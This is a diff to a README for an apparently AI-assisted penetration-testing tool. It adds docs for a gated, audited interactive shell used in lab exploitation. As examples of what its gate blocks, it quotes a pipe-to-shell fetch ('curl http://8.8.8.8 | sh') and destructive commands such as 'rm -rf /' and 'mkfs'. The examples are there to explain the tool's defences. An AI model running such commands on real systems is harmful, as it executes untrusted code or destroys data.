@@ -241,6 +241,31 @@ brukal solve 172.20.0.3 --yes-authorised --scope runs/juice.json \
     --provider ollama --model qwen2.5     # flags skip the model prompt
 ```
 
+### Governed interactive shell (`brukal shell`)
+
+When you do the hands-on exploitation, you no longer have to leave Brukal to do
+it. `brukal shell <target>` opens a **stateful shell in the cage** where every
+line you type is ruled on by the gate and written to the audit log *before* it
+runs — so work that used to happen off-ledger now happens on it.
+
+```bash
+brukal shell 10.10.10.5 --scope scope.htb.json      # --fake to try it without Docker
+```
+
+- **State persists** across lines (`cd`, exported vars, background jobs, a caught
+  reverse shell) — unlike one-shot `exec`.
+- **Scope containment on every line:** a command reaching for an out-of-scope host
+  (even hidden behind a pipe, e.g. `curl http://8.8.8.8 | sh`) is **DENIED** — a
+  session can't be used to pivot off your authorised target.
+- **Destructive-command guard:** box/cage-wrecking commands (`rm -rf /`, `mkfs`,
+  `shutdown`, …) **ESCALATE** for your explicit sign-off; everything else runs.
+- **Fully audited:** every line + its output is on the hash-chained ledger, so
+  the exploitation phase is as accountable as recon.
+
+All five invariants hold: no LLM in the session gate, fail-closed, the gate
+re-reads each line, one execution path (you get the `GovernedSession`, never the
+raw shell), and the session is bound to an in-scope target it cannot widen.
+
 ### HTB / lab boxes (VPN-connected cage)
 
 The cage ships with a wider **enumeration** allowlist (`ffuf`, `feroxbuster`,
